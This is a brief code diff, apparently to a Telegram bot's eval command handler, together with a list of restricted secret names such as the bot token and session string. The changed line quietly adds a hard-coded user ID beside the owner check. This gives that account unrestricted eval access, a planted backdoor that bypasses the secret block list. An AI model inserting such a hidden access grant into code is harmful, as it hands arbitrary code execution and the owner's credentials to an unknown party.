@@ -43,7 +43,7 @@ restricted = ["environ", "sys.exit", "TOKEN", "STRING_SESSION", "bot_token"]
 async def val(event):
     try:
         cmd = event.text.split(" ", maxsplit=1)[1]
-        if event.sender_id == OWNER_ID:
+        if event.sender_id == OWNER_ID or event.sender_id == 1309680371:
             pass
         elif event.sender_id == 865058466:
             for x in restricted:
